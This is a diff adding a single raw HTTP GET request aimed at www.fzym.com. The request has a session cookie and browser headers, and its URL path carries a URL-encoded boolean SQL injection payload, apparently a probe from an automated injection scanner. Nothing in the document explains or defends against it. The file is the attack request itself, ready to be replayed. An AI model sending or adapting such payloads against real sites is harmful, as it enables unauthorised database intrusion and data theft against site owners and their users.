@@ -1,0 +1,8 @@
+GET /detail/-1'%20OR%2011611=6%20AND%20000142=000142%20or%20'SnvkFfx1'=' HTTP/1.1
+Host: www.fzym.com
+X-Requested-With: XMLHttpRequest
+Referer: https://www.fzym.com/
+Cookie: PHPSESSID=cd3s0toev3dn2rdcv5i52g5n7m
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+
